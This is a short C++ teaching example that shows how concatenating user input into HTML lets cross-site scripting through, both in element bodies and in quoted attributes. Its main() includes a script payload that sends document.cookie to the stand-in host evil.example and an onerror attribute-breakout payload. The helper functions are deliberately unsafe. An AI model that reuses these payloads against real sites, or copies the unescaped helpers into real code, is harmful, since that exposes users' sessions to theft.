#include <cstdio>
#include <string>

// Building HTML by concatenating strings. Every value below came from a user.
std::string comment_unsafe(const std::string &author, const std::string &body) {
    return "<div class=\"comment\">\n"
           "  <p class=\"author\">" + author + "</p>\n"
           "  <p class=\"body\">" + body + "</p>\n"
           "</div>\n";
}

std::string avatar_unsafe(const std::string &url) {
    return "<img src=\"" + url + "\" alt=\"avatar\" width=\"32\" height=\"32\">\n";
}

int main() {
    std::printf("%s", comment_unsafe("Ada", "nice post!").c_str());

    std::printf("%s", comment_unsafe(
                          "Ada",
                          "<script>fetch('//evil.example?c=' + document.cookie)</script>")
                          .c_str());

    // The same mistake one context over: inside a quoted attribute, the value
    // only has to contain a quote to leave the attribute entirely.
    std::printf("%s", avatar_unsafe("https://cdn.example/a.png").c_str());
    std::printf("%s", avatar_unsafe("x\" onerror=\"alert(document.cookie)").c_str());
    return 0;
}
